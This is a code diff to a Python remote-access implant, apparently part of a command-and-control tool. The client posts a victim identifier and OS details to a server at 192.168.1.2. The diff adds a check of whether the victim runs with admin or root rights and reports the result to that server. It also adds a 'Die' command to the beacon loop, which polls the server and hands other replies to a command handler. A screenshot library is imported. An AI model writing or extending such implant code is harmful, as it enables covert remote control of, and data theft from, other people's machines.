@@ -12,12 +12,20 @@ import sys
 import traceback
 from mss import mss
 from os.path import isfile, join
+import ctypes
 
 
 def staging(identifier):
 	url = 'http://192.168.1.2:8080/stage_0'
+	platform_name = platform.system()
+	
+	if platform_name == 'Windows':
+		admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+	elif platform_name == 'Linux':
+		admin = os.getuid() == 0
+
 	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-	os_info = {'platform': platform.system(), 'version': platform.release()}
+	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin}
 	r = requests.post(url = url,cookies = cookies, data = os_info)
 	return r
 
@@ -31,8 +39,10 @@ def beacon(identifier):
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 		r = requests.get(url=url,cookies = cookies)
 
-
-		if r.text != 'Nothing Fishy going on here :)':
+		## Server has commanded the victim to die
+		if r.text == 'Die':
+			exit()
+		elif r.text != 'Nothing Fishy going on here :)':
 			## Didin't get default reply, so some command has been sent?
 			handle_commands(r,identifier)
 
